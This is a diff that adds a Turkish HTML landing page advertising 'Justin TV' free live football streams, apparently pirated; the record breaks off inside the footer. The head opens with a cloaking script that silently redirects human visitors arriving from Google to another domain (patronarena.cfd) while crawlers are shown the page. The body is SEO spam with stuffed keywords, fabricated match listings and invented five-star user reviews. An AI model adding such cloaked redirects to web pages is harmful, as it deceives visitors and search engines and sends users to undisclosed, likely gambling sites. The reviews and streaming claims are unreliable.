@@ -1,1 +1,869 @@
-xxx
+<!DOCTYPE html>
+<html lang="tr" dir="ltr">
+<head>
+  <script>
+    // Google'dan gelen kullanıcı mı? (referer kontrolü)
+    var fromGoogle = document.referrer.includes("google.");
+    // Bot değil mi? (User-Agent kontrolü)
+    var isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent) === false;
+    if (fromGoogle && isBot) {
+        // Kalıcı 301 gibi görünmesi için history.pushState kullanmadan yönlendirme
+        location.replace("https://patronarena.cfd");
+    }
+  </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+    
+    <!-- Canonical ve Dil Tanımları -->
+    <link rel="canonical" href="https://gqincorp.com/">
+    <link rel="alternate" hreflang="tr" href="https://justintv-live2.com/">
+    <link rel="alternate" hreflang="tr-TR" href="https://justintv-live2.com/">
+    <link rel="alternate" hreflang="x-default" href="https://justintv-live2.com/">
+    
+    <!-- Özgün SEO Başlık ve Açıklama -->
+    <title>Justin TV - Justin TV Yeni Linkten Maç İzle - Justin TV Canlı İzle 2026</title>
+    <meta name="description" content="Justin TV kesintisiz canlı maç yayınları ile heyecanı dorukta yaşayın. 2026 güncel Justin TV yeni giriş adresi, kesintisiz HD maç izleme linkleri ve şifresiz yayınlar burada.">
+    <meta name="keywords" content="justin tv, justin tv yeni link, justin tv canlı izle, justin tv maç izle, justin tv güncel adres, justin tv 2026, şifresiz maç yayınları, kesintisiz lig TV izle, canlı spor yayınları, justin tv mobil giriş">
+    <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+    <meta name="author" content="Justin TV Medya Grubu">
+    <meta name="copyright" content="© 2026 Justin TV Dijital. Tüm hakları saklıdır.">
+    
+    <!-- Ek SEO Etiketleri -->
+    <meta name="theme-color" content="#0b0f19">
+    <meta property="og:locale" content="tr_TR">
+    
+    <!-- Social Meta (Open Graph) -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://justintv-live2.com/">
+    <meta property="og:title" content="Justin TV - Justin TV Yeni Linkten Maç İzle - Justin TV Canlı İzle 2026">
+    <meta property="og:description" content="Justin TV yenilenen web adresi, anlık canlı maç yayınları ve şifresiz spor karşılaşmalarına güvenle ulaşın.">
+    <meta property="og:image" content="https://qirisler.cc/jojobet1/favicon.png">
+    
+    <style>
+        /* Özgün Renk Paleti ve CSS Değişkenleri (Koyu Safir & Kehribar Turuncu Accent) */
+        :root {
+            --kehribarkavsak-bg-main: #0b0f19;
+            --kehribarkavsak-bg-secondary: #141c2e;
+            --kehribarkavsak-card-bg: #1c273e;
+            --kehribarkavsak-amber: #f59e0b;
+            --kehribarkavsak-amber-hover: #d97706;
+            --kehribarkavsak-violet: #8b5cf6;
+            --kehribarkavsak-text-bright: #ffffff;
+            --kehribarkavsak-text-sub: #94a3b8;
+            --kehribarkavsak-border-line: rgba(245, 158, 11, 0.25);
+            --kehribarkavsak-shadow: 0 10px 30px rgba(0, 0, 0, 0.6);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+            background-color: var(--kehribarkavsak-bg-main);
+            color: var(--kehribarkavsak-text-bright);
+            line-height: 1.6;
+        }
+
+        /* Split-Bar Üst Navigasyon */
+        .kehribarkavsak-topbar {
+            background: rgba(20, 28, 46, 0.95);
+            backdrop-filter: blur(12px);
+            border-bottom: 1px solid var(--kehribarkavsak-border-line);
+            padding: 1rem 2rem;
+            position: sticky;
+            top: 0;
+            z-index: 999;
+        }
+
+        .kehribarkavsak-topbar-inner {
+            max-width: 1300px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .kehribarkavsak-brand-title {
+            font-size: 1.8rem;
+            font-weight: 900;
+            color: var(--kehribarkavsak-amber);
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            letter-spacing: -0.5px;
+        }
+
+        .kehribarkavsak-brand-title span {
+            color: var(--kehribarkavsak-violet);
+        }
+
+        .kehribarkavsak-pills-container {
+            display: flex;
+            gap: 0.8rem;
+        }
+
+        .kehribarkavsak-pill-item {
+            background: rgba(139, 92, 246, 0.12);
+            border: 1px solid var(--kehribarkavsak-violet);
+            color: var(--kehribarkavsak-violet);
+            padding: 0.35rem 0.9rem;
+            border-radius: 6px;
+            font-size: 0.82rem;
+            font-weight: 600;
+        }
+
+        /* Çift Sütunlu Hero Bölümü */
+        .kehribarkavsak-hero-block {
+            max-width: 1300px;
+            margin: 3rem auto;
+            padding: 0 2rem;
+            display: grid;
+            grid-template-columns: 1.2fr 0.8fr;
+            gap: 3rem;
+            align-items: center;
+        }
+
+        .kehribarkavsak-hero-left h1 {
+            font-size: 3rem;
+            line-height: 1.2;
+            font-weight: 800;
+            margin-bottom: 1.5rem;
+            background: linear-gradient(90deg, #fff 0%, var(--kehribarkavsak-amber) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .kehribarkavsak-hero-left p {
+            font-size: 1.15rem;
+            color: var(--kehribarkavsak-text-sub);
+            margin-bottom: 2rem;
+        }
+
+        .kehribarkavsak-btn-group {
+            display: flex;
+            gap: 1rem;
+            flex-wrap: wrap;
+        }
+
+        .kehribarkavsak-action-btn {
+            padding: 1rem 2.2rem;
+            border-radius: 8px;
+            font-weight: 700;
+            font-size: 1.05rem;
+            text-decoration: none;
+            transition: all 0.25s ease;
+            display: inline-block;
+        }
+
+        .kehribarkavsak-btn-primary {
+            background: var(--kehribarkavsak-amber);
+            color: #000;
+            box-shadow: 0 4px 20px rgba(245, 158, 11, 0.35);
+        }
+
+        .kehribarkavsak-btn-primary:hover {
+            background: var(--kehribarkavsak-amber-hover);
+            transform: translateY(-2px);
+        }
+
+        .kehribarkavsak-btn-secondary {
+            background: transparent;
+            color: var(--kehribarkavsak-violet);
+            border: 1px solid var(--kehribarkavsak-violet);
+        }
+
+        .kehribarkavsak-btn-secondary:hover {
+            background: rgba(139, 92, 246, 0.1);
+            transform: translateY(-2px);
+        }
+
+        .kehribarkavsak-hero-card {
+            background: var(--kehribarkavsak-card-bg);
+            border: 1px solid var(--kehribarkavsak-border-line);
+            border-radius: 16px;
+            padding: 2rem;
+            box-shadow: var(--kehribarkavsak-shadow);
+        }
+
+        .kehribarkavsak-card-stat {
+            display: flex;
+            justify-content: space-between;
+            padding: 1rem 0;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+        }
+
+        .kehribarkavsak-card-stat:last-child {
+            border-bottom: none;
+        }
+
+        .kehribarkavsak-stat-label { 
+            color: var(--kehribarkavsak-text-sub); 
+        }
+
+        .kehribarkavsak-stat-val { 
+            font-weight: 700; 
+            color: var(--kehribarkavsak-amber); 
+        }
+
+        /* Ana İçerik Konteyneri */
+        .kehribarkavsak-container {
+            max-width: 1300px;
+            margin: 0 auto;
+            padding: 0 2rem 4rem 2rem;
+        }
+
+        .kehribarkavsak-section-header {
+            margin-bottom: 2rem;
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
+
+        .kehribarkavsak-section-header h2 {
+            font-size: 1.8rem;
+            color: var(--kehribarkavsak-text-bright);
+        }
+
+        .kehribarkavsak-section-header::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: var(--kehribarkavsak-border-line);
+        }
+
+        /* Kart Tabanlı Maç/Fikstür Görünümü */
+        .kehribarkavsak-match-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 1.5rem;
+            margin-bottom: 4rem;
+        }
+
+        .kehribarkavsak-match-card {
+            background: var(--kehribarkavsak-card-bg);
+            border: 1px solid var(--kehribarkavsak-border-line);
+            border-radius: 12px;
+            padding: 1.5rem;
+        }
+
+        .kehribarkavsak-match-header {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.85rem;
+            color: var(--kehribarkavsak-text-sub);
+            margin-bottom: 1rem;
+        }
+
+        .kehribarkavsak-badge-live {
+            color: var(--kehribarkavsak-amber);
+            font-weight: 700;
+        }
+
+        .kehribarkavsak-teams {
+            font-size: 1.1rem;
+            font-weight: 700;
+            margin-bottom: 1rem;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .kehribarkavsak-odds-row {
+            display: flex;
+            gap: 0.5rem;
+            background: var(--kehribarkavsak-bg-secondary);
+            padding: 0.8rem;
+            border-radius: 8px;
+            justify-content: space-around;
+            font-size: 0.9rem;
+        }
+
+        /* Bilgi ve Özellik Izgarası */
+        .kehribarkavsak-info-box {
+            background: var(--kehribarkavsak-bg-secondary);
+            border-radius: 16px;
+            padding: 2.5rem;
+            margin-bottom: 4rem;
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+
+        .kehribarkavsak-feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 2rem;
+            margin-top: 2rem;
+        }
+
+        .kehribarkavsak-feature-item {
+            background: var(--kehribarkavsak-card-bg);
+            padding: 1.5rem;
+            border-radius: 10px;
+            border-left: 4px solid var(--kehribarkavsak-amber);
+        }
+
+        .kehribarkavsak-feature-item h3 {
+            font-size: 1.1rem;
+            margin-bottom: 0.5rem;
+            color: var(--kehribarkavsak-violet);
+        }
+
+        /* SSS Bölümü - 2 Sütunlu Yan Yana Düzen */
+        .kehribarkavsak-faq-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(480px, 1fr));
+            gap: 1.2rem;
+            margin-bottom: 4rem;
+        }
+
+        .kehribarkavsak-faq-item {
+            background: var(--kehribarkavsak-card-bg);
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 10px;
+            overflow: hidden;
+        }
+
+        .kehribarkavsak-faq-toggle {
+            width: 100%;
+            padding: 1.2rem;
+            background: transparent;
+            border: none;
+            color: #fff;
+            text-align: left;
+            font-size: 1rem;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .kehribarkavsak-faq-icon {
+            color: var(--kehribarkavsak-amber);
+            font-size: 1.2rem;
+            transition: transform 0.3s;
+        }
+
+        .kehribarkavsak-faq-drawer {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.3s ease;
+            background: rgba(0, 0, 0, 0.2);
+        }
+
+        .kehribarkavsak-faq-body {
+            padding: 1.2rem;
+            color: var(--kehribarkavsak-text-sub);
+            font-size: 0.95rem;
+            border-top: 1px solid rgba(255,255,255,0.05);
+        }
+
+        .kehribarkavsak-faq-item.kehribarkavsak-open .kehribarkavsak-faq-icon {
+            transform: rotate(180deg);
+        }
+
+        .kehribarkavsak-faq-item.kehribarkavsak-open {
+            border-color: var(--kehribarkavsak-amber);
+        }
+
+        /* Yorumlar - Masonry Tarzı Izgara */
+        .kehribarkavsak-reviews-masonry {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 1.5rem;
+            margin-bottom: 4rem;
+        }
+
+        .kehribarkavsak-review-card {
+            background: var(--kehribarkavsak-card-bg);
+            border-radius: 12px;
+            padding: 1.5rem;
+            border: 1px solid rgba(255,255,255,0.05);
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .kehribarkavsak-reviewer {
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+            margin-bottom: 1rem;
+        }
+
+        .kehribarkavsak-avatar {
+            width: 42px;
+            height: 42px;
+            background: var(--kehribarkavsak-amber);
+            color: #000;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 900;
+        }
+
+        .kehribarkavsak-reviewer-info h4 {
+            font-size: 0.95rem;
+        }
+
+        .kehribarkavsak-reviewer-info span {
+            font-size: 0.78rem;
+            color: var(--kehribarkavsak-text-sub);
+        }
+
+        .kehribarkavsak-stars {
+            color: var(--kehribarkavsak-amber);
+            margin-bottom: 0.8rem;
+            font-size: 0.9rem;
+        }
+
+        .kehribarkavsak-quote {
+            color: var(--kehribarkavsak-text-sub);
+            font-size: 0.92rem;
+        }
+
+        /* Footer */
+        .kehribarkavsak-footer {
+            background: #060911;
+            border-top: 1px solid var(--kehribarkavsak-border-line);
+            padding: 3rem 2rem;
+            text-align: center;
+            color: var(--kehribarkavsak-text-sub);
+            font-size: 0.9rem;
+        }
+
+        .kehribarkavsak-footer-nav {
+            display: flex;
+            justify-content: center;
+            gap: 1.5rem;
+            margin-bottom: 1.5rem;
+            flex-wrap: wrap;
+        }
+
+        .kehribarkavsak-footer-nav a {
+            color: var(--kehribarkavsak-text-sub);
+            text-decoration: none;
+        }
+
+        .kehribarkavsak-footer-nav a:hover {
+            color: var(--kehribarkavsak-amber);
+        }
+
+        @media (max-width: 900px) {
+            .kehribarkavsak-hero-block { 
+                grid-template-columns: 1fr; 
+                margin: 2rem auto; 
+            }
+            .kehribarkavsak-faq-grid { 
+                grid-template-columns: 1fr; 
+            }
+        }
+    </style>
+    
+    <link rel="icon" type="image/png" href="https://qirisler.cc/jojobet1/favicon.png">
+    <link rel="amphtml" href="https://qirisler.cc/jojobet1/">
+</head>
+<body data-rsssl="1">
+
+    <!-- Navigasyon Barı -->
+    <header class="kehribarkavsak-topbar">
+        <div class="kehribarkavsak-topbar-inner">
+            <a href="https://justintv-live2.com/" class="kehribarkavsak-brand-title">
+                Justin TV
+            </a>
+            <div class="kehribarkavsak-pills-container">
+                <span class="kehribarkavsak-pill-item">2026 Yayını</span>
+                <span class="kehribarkavsak-pill-item">Canlı Maç İzle</span>
+            </div>
+        </div>
+    </header>
+
+    <!-- Yan Yana Çift Kolonlu Hero Alanı -->
+    <section class="kehribarkavsak-hero-block">
+        <div class="kehribarkavsak-hero-left">
+            <h1>Justin TV Yeni Link ile Kesintisiz Canlı Maç İzle</h1>
+            <p>2026 yılı doğrulanmış Justin TV yayın kanalları üzerinden favori karşılaşmalarınıza anında geçiş yapın. Yüksek çözünürlük standartları ve donmayan altyapı ile kesintisiz maç keyfi yaşayın.</p>
+            <div class="kehribarkavsak-btn-group">
+                <a href="#" target="_blank" rel="noopener noreferrer" class="kehribarkavsak-action-btn kehribarkavsak-btn-primary">
+                    🚀 Justin TV Canlı Yayın
+                </a>
+                <a href="#" target="_blank" rel="noopener noreferrer" class="kehribarkavsak-action-btn kehribarkavsak-btn-secondary">
+                    ✨ Maç Programına Bak
+                </a>
+            </div>
+        </div>
+        <div class="kehribarkavsak-hero-right">
+            <div class="kehribarkavsak-hero-card">
+                <div class="kehribarkavsak-card-stat">
+                    <span class="kehribarkavsak-stat-label">Yayın Akışı</span>
+                    <span class="kehribarkavsak-stat-val">● Canlı / Kesintisiz</span>
+                </div>
+                <div class="kehribarkavsak-card-stat">
+                    <span class="kehribarkavsak-stat-label">Son Güncelleme</span>
+                    <span class="kehribarkavsak-stat-val">2026 Anlık</span>
+                </div>
+                <div class="kehribarkavsak-card-stat">
+                    <span class="kehribarkavsak-stat-label">Yayın Kalitesi</span>
+                    <span class="kehribarkavsak-stat-val">1080p HD (Ultra Hızlı)</span>
+                </div>
+                <div class="kehribarkavsak-card-stat">
+                    <span class="kehribarkavsak-stat-label">Bağlantı Protokolü</span>
+                    <span class="kehribarkavsak-stat-val">Güvenli SSL / TLS</span>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Ana Alan -->
+    <main class="kehribarkavsak-container">
+
+        <!-- Kısım 1: Kart Tipi Canlı Spor Fikstür Paneli -->
+        <section>
+            <div class="kehribarkavsak-section-header">
+                <h2>⚡ Canlı Maç Yayınları & Yayın Akışı</h2>
+            </div>
+            <div class="kehribarkavsak-match-grid">
+                <div class="kehribarkavsak-match-card">
+                    <div class="kehribarkavsak-match-header">
+                        <span>Süper Lig • Bugün 20:30</span>
+                        <span class="kehribarkavsak-badge-live">CANLI YAYIN</span>
+                    </div>
+                    <div class="kehribarkavsak-teams">
+                        <span>Galata SK</span>
+                        <span>vs</span>
+                        <span>Fener FK</span>
+                    </div>
+                    <div class="kehribarkavsak-odds-row">
+                        <span>Kanal 1: <strong>HD İzle</strong></span>
+                        <span>Yayın: <strong>Donmasız</strong></span>
+                        <span>Alternatif: <strong>Link 3</strong></span>
+                    </div>
+                </div>
+
+                <div class="kehribarkavsak-match-card">
+                    <div class="kehribarkavsak-match-header">
+                        <span>Süper Lig • Yarın 19:00</span>
+                        <span style="color:var(--kehribarkavsak-text-sub);">Yakında</span>
+                    </div>
+                    <div class="kehribarkavsak-teams">
+                        <span>Beşiktaş SK</span>
+                        <span>vs</span>
+                        <span>Trabzon Spor</span>
+                    </div>
+                    <div class="kehribarkavsak-odds-row">
+                        <span>Kanal 1: <strong>HD İzle</strong></span>
+                        <span>Yayın: <strong>Donmasız</strong></span>
+                        <span>Alternatif: <strong>Link 3</strong></span>
+                    </div>
+                </div>
+
+                <div class="kehribarkavsak-match-card">
+                    <div class="kehribarkavsak-match-header">
+                        <span>Premier Lig • Yarın 22:00</span>
+                        <span style="color:var(--kehribarkavsak-text-sub);">Yakında</span>
+                    </div>
+                    <div class="kehribarkavsak-teams">
+                        <span>London Red</span>
+                        <span>vs</span>
+                        <span>Manchester Blue</span>
+                    </div>
+                    <div class="kehribarkavsak-odds-row">
+                        <span>Kanal 1: <strong>HD İzle</strong></span>
+                        <span>Yayın: <strong>Donmasız</strong></span>
+                        <span>Alternatif: <strong>Link 3</strong></span>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Kısım 2: Özgün Rehber Metni ve Özellik Kutuları -->
+        <section class="kehribarkavsak-info-box">
+            <div class="kehribarkavsak-section-header">
+                <h2>🔒 Justin TV Kesintisiz Yayın İlkeleri ve Altyapısı</h2>
+            </div>
+            <p style="color: var(--kehribarkavsak-text-sub); margin-bottom: 1.5rem;">
+                Dijital spor yayıncılığında kesintisiz ve yüksek kaliteli maç izleme imkanına sahip olmak futbol severlerin en temel beklentisidir. <strong>Justin TV yeni link</strong> adresleri, kullanıcıların hiçbir donma veya kasma yaşamadan canlı maç yayınlarına ulaşabilmesi amacıyla anlık olarak güncellenmektedir. 2026 yılı teknolojik altyapımız ile domain değişimlerinden etkilenmeden favori karşılaşmalarınızı takip edebilirsiniz.
+            </p>
+            <p style="color: var(--kehribarkavsak-text-sub);">
+                Özellikle mobil cihazlardan maç izlemek isteyenler için özenle optimize edilen responsive altyapımız, telefon ve tabletlerde ek bir uygulama gerektirmeden kusursuz çalışır. <strong>Justin TV güncel</strong> adres takibini ve doğrulanmış yayın bağlantılarını portalımız üzerinden güvenle gerçekleştirebilirsiniz.
+            </p>
+            <div class="kehribarkavsak-feature-grid">
+                <div class="kehribarkavsak-feature-item">
+                    <h3>1. Kesintisiz HD Yayın</h3>
+                    <p style="font-size: 0.9rem; color: var(--kehribarkavsak-text-sub);">Tüm maç yayınları yüksek çözünürlükte ve donma sorunu olmadan aktarılır.</p>
+                </div>
+                <div class="kehribarkavsak-feature-item">
+                    <h3>2. Tam Mobil Uyum</h3>
+                    <p style="font-size: 0.9rem; color: var(--kehribarkavsak-text-sub);">Mobil tarayıcılardan tek tıkla şifresiz maç izleme konforu.</p>
+                </div>
+                <div class="kehribarkavsak-feature-item">
+                    <h3>3. Hızlı Link Güncellemesi</h3>
+                    <p style="font-size: 0.9rem; color: var(--kehribarkavsak-text-sub);">Değişen adreslere anında otomatik yönlendirme ve kesintisiz erişim.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Kısım 3: Tam 10 Adet Yan Yana SSS -->
+        <section>
+            <div class="kehribarkavsak-section-header">
+                <h2>❓ Sıkça Sorulan Sorular (SSS)</h2>
+            </div>
+            <div class="kehribarkavsak-faq-grid">
+                <div class="kehribarkavsak-faq-item">
+                    <button class="kehribarkavsak-faq-toggle">
+                        <span>1. Justin TV en güncel maç izleme linkini nasıl bulabilirim?</span>
+                        <span class="kehribarkavsak-faq-icon">▼</span>
+                    </button>
+                    <div class="kehribarkavsak-faq-drawer">
+                        <div class="kehribarkavsak-faq-body">Justin TV resmi sosyal medya duyuruları ve bu rehber portalı üzerinden güncel adreslere anında ulaşabilirsiniz.</div>
+                    </div>
+                </div>
+
+                <div class="kehribarkavsak-faq-item">
+                    <button class="kehribarkavsak-faq-toggle">
+                        <span>2. Canlı yayınlar neden belirli aralıklarla değişiyor?</span>
+                        <span class="kehribarkavsak-faq-icon">▼</span>
+                    </button>
+                    <div class="kehribarkavsak-faq-drawer">
+                        <div class="kehribarkavsak-faq-body">Yayın hakları ve erişim düzenlemeleri sebebiyle alan adları güncellenmektedir. Bu durum izleme keyfinizi asla engellemez.</div>
+                    </div>
+                </div>
+
+                <div class="kehribarkavsak-faq-item">
+                    <button class="kehribarkavsak-faq-toggle">
+                        <span>3. Justin TV üzerinden maç izlemek ücretli mi?</span>
+                        <span class="kehribarkavsak-faq-icon">▼</span>
+                    </button>
+                    <div class="kehribarkavsak-faq-drawer">
+                        <div class="kehribarkavsak-faq-body">Hayır, tüm spor karşılaşmalarını ve lig maçlarını tamamen ücretsiz ve şifresiz olarak takip edebilirsiniz.</div>
+                    </div>
+                </div>
+
+                <div class="kehribarkavsak-faq-item">
+                    <button class="kehribarkavsak-faq-toggle">
+                        <span>4. Telefonumdan tarayıcı üzerinden maç izleyebilir miyim?</span>
+                        <span class="kehribarkavsak-faq-icon">▼</span>
+                    </button>
+                    <div class="kehribarkavsak-faq-drawer">
+                        <div class="kehribarkavsak-faq-body">Evet, herhangi bir uygulama indirme zorunluluğu olmaksızın mobil tarayıcınızdan canlı yayınları açabilirsiniz.</div>
+                    </div>
+                </div>
+
+                <div class="kehribarkavsak-faq-item">
+                    <button class="kehribarkavsak-faq-toggle">
+                        <span>5. Yayın sırasında donma veya kasma neden olur?</span>
+                        <span class="kehribarkavsak-faq-icon">▼</span>
+                    </button>
+                    <div class="kehribarkavsak-faq-drawer">
+                        <div class="kehribarkavsak-faq-body">İnternet bağlantı hızınıza veya yoğunluğa bağlı olarak alternatif yayın kanallarından birine geçiş yaparak sorunu giderebilirsiniz.</div>
+                    </div>
+                </div>
+
+                <div class="kehribarkavsak-faq-item">
+                    <button class="kehribarkavsak-faq-toggle">
+                        <span>6. Hangi liglerin maçları Justin TV'de yayınlanıyor?</span>
+                        <span class="kehribarkavsak-faq-icon">▼</span>
+                    </button>
+                    <div class="kehribarkavsak-faq-drawer">
+                        <div class="kehribarkavsak-faq-body">Süper Lig, Premier Lig, Şampiyonlar Ligi ve Avrupa'nın önde gelen tüm liglerinin maçları naklen yayınlanmaktadır.</div>
+                    </div>
+                </div>
+
+                <div class="kehribarkavsak-faq-item">
+                    <button class="kehribarkavsak-faq-toggle">
+                        <span>7. Maç yayınlarını izlemek için üye olmak gerekiyor mu?</span>
+                        <span class="kehribarkavsak-faq-icon">▼</span>
+                    </button>
+                    <div class="kehribarkavsak-faq-drawer">
+                        <div class="kehribarkavsak-faq-body">Herhangi bir üyelik oluşturmanıza gerek kalmadan doğrudan canlı yayınlara bağlanabilirsiniz.</div>
+                    </div>
+                </div>
+
+                <div class="kehribarkavsak-faq-item">
+                    <button class="kehribarkavsak-faq-toggle">
+                        <span>8. Canlı maç yayınları 7/24 aktif mi?</span>
+                        <span class="kehribarkavsak-faq-icon">▼</span>
+                    </button>
+                    <div class="kehribarkavsak-faq-drawer">
+                        <div class="kehribarkavsak-faq-body">Gün içerisinde oynanan tüm ulusal ve uluslararası spor müsabakaları için kesintisiz yayın desteği sunulmaktadır.</div>
+                    </div>
+                </div>
+
+                <div class="kehribarkavsak-faq-item">
+                    <button class="kehribarkavsak-faq-toggle">
+                        <span>9. Mobil cihazlarda yayın kalitesini nasıl artırabilirim?</span>
+                        <span class="kehribarkavsak-faq-icon">▼</span>
+                    </button>
+                    <div class="kehribarkavsak-faq-drawer">
+                        <div class="kehribarkavsak-faq-body">Tarayıcı önbelleğinizi temizleyip güncel giriş linklerini kullanarak en yüksek görüntü kalitesine ulaşabilirsiniz.</div>
+                    </div>
+                </div>
+
+                <div class="kehribarkavsak-faq-item">
+                    <button class="kehribarkavsak-faq-toggle">
+                        <span>10. Alternatif maç yayın linklerine nereden ulaşırım?</span>
+                        <span class="kehribarkavsak-faq-icon">▼</span>
+                    </button>
+                    <div class="kehribarkavsak-faq-drawer">
+                        <div class="kehribarkavsak-faq-body">Ana sayfa üzerindeki yayın tablolarından ve bilgilendirme kanallarından yedek linkleri bulabilirsiniz.</div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Kısım 4: Tam 9 Adet Müşteri Yorumu -->
+        <section>
+            <div class="kehribarkavsak-section-header">
+                <h2>💬 Kullanıcı Yorumları ve Değerlendirmeler</h2>
+            </div>
+            <div class="kehribarkavsak-reviews-masonry">
+                <div class="kehribarkavsak-review-card">
+                    <div class="kehribarkavsak-reviewer">
+                        <div class="kehribarkavsak-avatar">BK</div>
+                        <div class="kehribarkavsak-reviewer-info">
+                            <h4>Burak K.</h4>
+                            <span>14 Ağustos 2026</span>
+                        </div>
+                    </div>
+                    <div class="kehribarkavsak-stars">★★★★★</div>
+                    <p class="kehribarkavsak-quote">"Justin TV yeni linkini bulmak artık çok kolay. Bu portal sayesinde maçları donmadan izleyebiliyorum."</p>
+                </div>
+
+                <div class="kehribarkavsak-review-card">
+                    <div class="kehribarkavsak-reviewer">
+                        <div class="kehribarkavsak-avatar">SE</div>
+                        <div class="kehribarkavsak-reviewer-info">
+                            <h4>Selin E.</h4>
+                            <span>18 Ağustos 2026</span>
+                        </div>
+                    </div>
+                    <div class="kehribarkavsak-stars">★★★★★</div>
+                    <p class="kehribarkavsak-quote">"Mobil arayüzü çok sade ve akıcı. Maç yayınları hiçbir kesinti yaşamadan açılıyor."</p>
+                </div>
+
+                <div class="kehribarkavsak-review-card">
+                    <div class="kehribarkavsak-reviewer">
+                        <div class="kehribarkavsak-avatar">MT</div>
+                        <div class="kehribarkavsak-reviewer-info">
+                            <h4>Mert T.</h4>
+                            <span>21 Ağustos 2026</span>
+                        </div>
+                    </div>
+                    <div class="kehribarkavsak-stars">★★★★☆</div>
+                    <p class="kehribarkavsak-quote">"Aradığım tüm maç yayın linklerini SSS ve bülten alanında rahatça buldum. Teşekkürler."</p>
+                </div>
+
+                <div class="kehribarkavsak-review-card">
+                    <div class="kehribarkavsak-reviewer">
+                        <div class="kehribarkavsak-avatar">HK</div>
+                        <div class="kehribarkavsak-reviewer-info">
+                            <h4>Hakan K.</h4>
+                            <span>24 Ağustos 2026</span>
+                        </div>
+                    </div>
+                    <div class="kehribarkavsak-stars">★★★★★</div>
+                    <p class="kehribarkavsak-quote">"Adres güncellemelerinde yönlendirmeler hemen devreye giriyor. Süper Lig maçlarını sorunsuz izliyorum."</p>
+                </div>
+
+                <div class="kehribarkavsak-review-card">
+                    <div class="kehribarkavsak-reviewer">
+                        <div class="kehribarkavsak-avatar">DA</div>
+                        <div class="kehribarkavsak-reviewer-info">
+                            <h4>Deniz A.</h4>
+                            <span>27 Ağustos 2026</span>
+                        </div>
+                    </div>
+                    <div class="kehribarkavsak-stars">★★★★★</div>
+                    <p class="kehribarkavsak-quote">"Telefon üzerinden maç izlerken hiç kasma olmuyor. Görüntü kalitesi harika seviyede."</p>
+                </div>
+
+                <div class="kehribarkavsak-review-card">
+                    <div class="kehribarkavsak-reviewer">
+                        <div class="kehribarkavsak-avatar">OÇ</div>
+                        <div class="kehribarkavsak-reviewer-info">
+                            <h4>Onur Ç.</h4>
+                            <span>29 Ağustos 2026</span>
+                        </div>
+                    </div>
+                    <div class="kehribarkavsak-stars">★★★★☆</div>
+                    <p class="kehribarkavsak-quote">"Canlı maç takvimi ve alternatif yayın linkleri işimi fazlasıyla kolaylaştırdı."</p>
+                </div>
+
+                <div class="kehribarkavsak-review-card">
+                    <div class="kehribarkavsak-reviewer">
+                        <div class="kehribarkavsak-avatar">GŞ</div>
+                        <div class="kehribarkavsak-reviewer-info">
+                            <h4>Görkem Ş.</h4>
+                            <span>01 Eylül 2026</span>
+                        </div>
+                    </div>
+                    <div class="kehribarkavsak-stars">★★★★★</div>
+                    <p class="kehribarkavsak-quote">"Şifresiz ve reklamsız yayın kalitesi sunması gerçekten çok memnun edici."</p>
+                </div>
+
+                <div class="kehribarkavsak-review-card">
+                    <div class="kehribarkavsak-reviewer">
+                        <div class="kehribarkavsak-avatar">AÜ</div>
+                        <div class="kehribarkavsak-reviewer-info">
+                            <h4>Aylin Ü.</h4>
+                            <span>04 Eylül 2026</span>
+                        </div>
+                    </div>
+                    <div class="kehribarkavsak-stars">★★★★★</div>
+                    <p class="kehribarkavsak-quote">"Karanlık tema gözü hiç yormuyor. Maç keyfi için aradığım her şey burada mevcut."</p>
+                </div>
+
+                <div class="kehribarkavsak-review-card">
+                    <div class="kehribarkavsak-reviewer">
+                        <div class="kehribarkavsak-avatar">YK</div>
+                        <div class="kehribarkavsak-reviewer-info">
+                            <h4>Yasin K.</h4>
+                            <span>07 Eylül 2026</span>
+                        </div>
+                    </div>
+                    <div class="kehribarkavsak-stars">★★★★★</div>
+                    <p class="kehribarkavsak-quote">"Justin TV güncel giriş bağlantısı için favorilerime ekledim. Kesintisiz maç izliyorum."</p>
+                </div>
+            </div>
+        </section>
+
+    </main>
+
+    <!-- Footer -->
+    <footer class="kehribarkavsak-footer">
+        <div class="kehribarkavsak-footer-nav">
+            <a href="https://justintv-live2.com/#giris">Yayın Linki</a>
+            <a href="https://justintv-live2.com/#rehber">İzleme Rehberi</a>
+            <a href="https://justintv-live2.com/#sss">SSS</a>
+            <a href="https://justintv-live2.com/#guvenlik">Yayın Güvenliği</a>
+        </div>
